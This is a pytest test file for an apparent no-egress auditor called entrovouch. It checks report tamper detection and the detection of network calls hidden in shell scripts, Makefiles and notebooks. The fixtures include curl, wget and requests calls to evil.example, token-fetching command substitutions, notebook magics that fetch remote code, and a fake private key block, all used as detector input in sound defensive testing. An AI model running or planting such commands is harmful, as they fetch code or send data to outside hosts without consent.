"""A report's digest describes the findings it shows; what decides a result is the files, never metadata the tree's
author writes; text a shell expands is read as the shell runs it. Each test asserts both halves: the false thing is
gone, the true neighbour stays."""
from __future__ import annotations

import hashlib
import json
import subprocess
import sys
from dataclasses import asdict
from pathlib import Path

import pytest

from entrovouch import cbom, key_provenance, sbom
from entrovouch.no_egress_auditor import (
    _sign, audit, canonical_body, findings_digest_matches, report_problem, reproducible_body, verify_report,
)
from entrovouch.sarif import to_sarif
from entrovouch.signer import MerkleSigner

REPO = Path(__file__).resolve().parents[1]
EVIL = "import requests\nrequests.get('https://evil.example/x')\n"
PEM = ("-----BEGIN RSA PRIVATE KEY-----\n" + "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun\n" * 4
       + "-----END RSA PRIVATE KEY-----\n")


def _write(root: Path, rel: str, text: str) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


def _put(root: Path, rel: str, data: bytes) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data)
    return p


def _cli(module: str, *args):
    return subprocess.run([sys.executable, "-W", "ignore", "-m", f"entrovouch.{module}", *map(str, args)],
                          cwd=REPO, capture_output=True, text=True, encoding="utf-8")


def _kinds(root: Path) -> list[tuple[int, str]]:
    return [(f["line"], f["kind"]) for f in audit(root, label="t").findings]


# ---------------------------------------------------------------- the digest describes the findings shown
def _rehash(d: dict) -> dict:
    d["content_hash"], d["integrity_tag"] = _sign(d)
    return d


def test_a_report_whose_digest_belongs_to_another_run_is_refused_signed_or_not(tmp_path):
    _write(tmp_path / "t", "evil.py", EVIL)
    signer = MerkleSigner.create(tmp_path / "k.json", height=3)
    honest = asdict(audit(tmp_path / "t", label="L", signer=signer))
    root = honest["public_root"]
    assert verify_report(honest, expected_root=root) == (True, "ATTESTED") and findings_digest_matches(honest)
    # the issuer edits the verdict, keeps the honest digest, re-hashes and re-signs
    lie = dict(honest, findings=[], verdict="CLEAN", signature={})
    lie = _rehash(lie)
    lie["signature"] = signer.sign(canonical_body(lie))
    assert verify_report(lie, expected_root=root) == (False, "TAMPERED")
    assert "findings_digest does not describe" in report_problem(lie)
    # an unsigned report edited and re-hashed is refused the same way
    plain = asdict(audit(tmp_path / "t", label="L"))
    edited = _rehash(dict(plain, findings=[], verdict="CLEAN"))
    (tmp_path / "e.json").write_text(json.dumps(edited), encoding="utf-8")
    for module in ("sarif", "attestation"):
        r = _cli(module, tmp_path / "e.json", "--out", tmp_path / f"{module}.json")
        assert r.returncode == 2 and "findings_digest" in r.stderr
    # recomputing the digest too is possible without a key: only a signature binds a report to its issuer
    edited["findings_digest"] = hashlib.sha3_256(reproducible_body(edited)).hexdigest()
    edited = _rehash(edited)
    assert report_problem(edited) is None and verify_report(edited) == (False, "UNSIGNED")
    assert to_sarif(edited)["runs"][0]["properties"]["signed"] is False
    assert to_sarif(honest)["runs"][0]["properties"]["signed"] is True


@pytest.mark.parametrize("build", ["egress", "cbom", "sbom"])
def test_every_honest_report_carries_its_own_digest(tmp_path, build):
    _write(tmp_path, "a.py", "import hashlib, requests\nhashlib.md5(b'x')\n")
    _write(tmp_path, "requirements.txt", "requests==2.31.0\n")
    rep = {"egress": lambda: audit(tmp_path, label="t"), "cbom": lambda: cbom.build_cbom(tmp_path, label="t"),
           "sbom": lambda: sbom.build_sbom(tmp_path, label="t")}[build]()
    assert findings_digest_matches(json.loads(json.dumps(asdict(rep))))


# ---------------------------------------------------------------- the files decide, never metadata
def test_a_worktree_git_file_and_a_used_checkout_change_nothing(tmp_path):
    for name in ("clone", "used"):
        _write(tmp_path / name, "main.py", EVIL)
    _write(tmp_path / "used", ".git", "gitdir: C:/Users/someone/repo/.git/worktrees/used\n")
    _write(tmp_path / "used", "src/pkg.egg-info/requires.txt", "requests\n")
    _write(tmp_path / "used", ".ipynb_checkpoints/demo-checkpoint.ipynb",
           json.dumps({"nbformat": 4, "cells": [{"cell_type": "code", "source": ["import ftplib\n"]}]}))
    clone, used = audit(tmp_path / "clone", label="t"), audit(tmp_path / "used", label="t")
    assert clone.findings_digest == used.findings_digest
    assert set(used.not_scanned["skipped_directories"]) == {".git", "src/pkg.egg-info/", ".ipynb_checkpoints/"}
    assert cbom.build_cbom(tmp_path / "clone", label="t").tree_listing_digest \
        == cbom.build_cbom(tmp_path / "used", label="t").tree_listing_digest


def test_the_cbom_lists_what_it_did_not_read(tmp_path):
    _write(tmp_path, "a.py", "import hashlib\nhashlib.md5(b'x')\n")
    _write(tmp_path, "build/b.py", "import hashlib\nhashlib.md5(b'x')\n")
    _write(tmp_path, "web/app.js", "crypto.createHash('md5')\n")
    rep = cbom.build_cbom(tmp_path, label="t")
    assert rep.not_scanned == {"skipped_directories": {"build/": 1}, "symbolic_links": 0, "files_not_python": 1}
    assert "Not Python, not read:** 1 file(s)" in cbom.render_markdown(rep)
    assert "Not read:** 1 skipped directory" in cbom.render_markdown(rep)


# ---------------------------------------------------------------- what the shell runs before Python sees the text
def test_command_substitution_inside_inline_python_or_a_heredoc_is_a_command(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        'python3 -c "token = \'$(curl -s $TOKEN_URL)\'"',
        'python3 -c "print(\'`wget -qO- $FEED`\')"',
        "python3 - <<EOF",
        'token = "$(curl -s $TOKEN_URL)"',
        "EOF",
        "python3 -c 'print(\"$(curl x)\")'",            # single quotes: the shell expands nothing
        "python3 - <<'EOF'",
        "import ftplib",                                   # quoted delimiter: no expansion, read as Python
        'x = "$(curl y)"',
        "EOF",
    ]) + "\n")
    assert _kinds(tmp_path) == [(1, "script-network-command"), (2, "script-network-command"),
                                (4, "script-network-command"), (8, "network-import")]


def test_in_a_makefile_dollar_paren_is_make_and_dollar_dollar_paren_is_the_shell(tmp_path):
    _write(tmp_path, "Makefile", "docs:\n"
           "\tuv run python -c \"import webbrowser; webbrowser.open('file://$(shell pwd)/index.html')\"\n"
           "\tpython -c \"t = '$$(curl -s $$URL)'\"\n")
    # `uv run` makes the environment first, which reaches the network for what is missing
    assert _kinds(tmp_path) == [(2, "network-import"), (2, "script-network-command"), (3, "script-network-command")]


def test_a_heredoc_is_python_only_when_an_interpreter_receives_it(tmp_path):
    _write(tmp_path, "a.sh", "\n".join([
        "bash <<'EOF' && python3 -V",
        'x = """',
        '" ; curl -s https://evil.example/p ; : "',
        '"""',
        "EOF",
        "cat <<'PY' | python3",
        "import ftplib",
        "PY",
    ]) + "\n")
    assert _kinds(tmp_path) == [(3, "script-network-command"), (7, "network-import")]


# ---------------------------------------------------------------- text as its reader reads it
def test_utf8_with_nul_bytes_is_read_as_utf8(tmp_path):
    pad = b"#\x00" + b"a\x00" * 2000
    _put(tmp_path / "req", "requirements.txt", pad + b"\nrequests==2.31.0\n")
    assert [c["name"] for c in asdict(sbom.build_sbom(tmp_path / "req", label="t"))["components"]] == ["requests"]
    _put(tmp_path / "kp", "notes.txt", pad + b"\n" + PEM.encode())
    found = key_provenance.scan_key_provenance(tmp_path / "kp", label="t").findings
    assert [(f["file"], f["kind"]) for f in found] == [("notes.txt", "key-file-in-tree")]


# ---------------------------------------------------------------- separators, and notebook magics that reach out
def test_an_escaped_backslash_leaves_a_real_separator(tmp_path):
    _write(tmp_path, "a.sh", 'echo C:\\\\; curl -s "$U"\necho done \\&& wget -q "$U"\necho "see" \\; curl x\n')
    assert _kinds(tmp_path) == [(1, "script-network-command"), (2, "script-network-command"),
                                (3, "script-network-word")]


def test_alias_pycat_and_shell_cells_are_reported(tmp_path):
    cells = [["%alias fetch curl -s https://evil.example/x\n", "%fetch\n"], ["%pycat https://evil.example/y.py\n"],
             ["%%!\n", "curl https://evil.example/z\n"], ["%alias\n"], ["%pycat setup.py\n"]]
    _write(tmp_path, "n.ipynb", json.dumps({"nbformat": 4,
                                            "cells": [{"cell_type": "code", "source": c} for c in cells]}))
    assert _kinds(tmp_path) == [(1, "subprocess-shell"), (2, "network-call"), (3, "subprocess-shell")]
